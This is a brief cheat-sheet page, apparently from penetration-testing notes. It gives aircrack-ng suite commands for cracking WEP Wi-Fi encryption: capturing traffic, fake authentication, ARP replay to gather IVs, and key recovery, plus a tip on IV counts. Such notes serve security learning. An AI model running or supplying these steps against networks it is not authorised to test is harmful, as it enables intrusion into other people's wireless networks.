# WEP

WEP is a legacy wireless encryption protocol broken by exploiting weaknesses in its IV (Initialization Vector) generation. By capturing enough traffic and replaying ARP packets to generate more, enough IVs can be collected to statistically recover the encryption key. Assumes the wireless adapter is already in monitor mode (see Deauthentication).

## Attack

| Command | Description |
|---|---|
| `ip addr` | Retrieves the Wi-Fi card's MAC address, needed for the fake authentication step below |
| `airodump-ng --channel [channel no] --bssid [BSSID] --write [file name] wlan0mon` | Captures traffic from the target network, saving packets to a file |
| `aireplay-ng --fakeauth 0 -a [BSSID] -h [MAC] wlan0mon` | Fake-authenticates with the access point so packet injection is accepted |
| `aireplay-ng --arpreplay -b [BSSID] -h [MAC] wlan0mon` | Replays captured ARP packets to generate more traffic, rapidly increasing IV count |
| `aircrack-ng [file name]-01.cap` | Cracks the WEP key from the captured IVs |

**Note:** Before running `aircrack-ng`, monitor the `#Data` column in the separately running `airodump-ng` to ensure the IV count has reached a sufficient level (typically ~20,000–40,000) — insufficient data can cause `aircrack-ng` to fail.
